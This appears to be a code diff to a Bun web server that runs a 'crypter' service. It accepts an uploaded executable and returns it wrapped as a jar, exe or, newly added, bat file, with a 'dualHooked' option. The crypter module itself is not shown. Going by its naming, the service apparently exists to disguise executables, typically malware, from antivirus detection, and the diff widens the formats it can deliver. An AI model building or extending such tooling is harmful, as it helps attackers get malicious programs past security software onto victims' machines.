@@ -1,7 +1,7 @@
 import { serve } from "bun";
 import fs from "fs";
 import path from "path";
-import { cryptToJar, cryptToExe } from "./crypter";
+import { cryptToJar, cryptToExe, cryptToBat } from "./crypter";
 
 const PORT = 7641;
 const PUBLIC = path.join(import.meta.dir, "../public");
@@ -33,8 +33,8 @@ serve({
       const dualHooked = form.get("dualHooked") === "true";
 
       if (!file) return json({ error: "No file provided" }, 400);
-      if (!["jar", "exe"].includes(format ?? ""))
-        return json({ error: "format must be jar | exe" }, 400);
+      if (!["jar", "exe", "bat"].includes(format ?? ""))
+        return json({ error: "format must be jar | exe | bat" }, 400);
 
       const exeData = Buffer.from(await file.arrayBuffer());
       const baseName = file.name.replace(/\.[^/.]+$/, "");
@@ -51,6 +51,11 @@ serve({
           outName = `${baseName}-crypt.jar`;
           mime = "application/java-archive";
           await cryptToJar(exeData, outFile, { dualHooked });
+        } else if (format === "bat") {
+          outFile = path.join(tmpOut, "out.bat");
+          outName = `${baseName}-crypt.bat`;
+          mime = "application/octet-stream";
+          await cryptToBat(exeData, outFile, { dualHooked });
         } else {
           outFile = path.join(tmpOut, "out.exe");
           outName = `${baseName}-crypt.exe`;
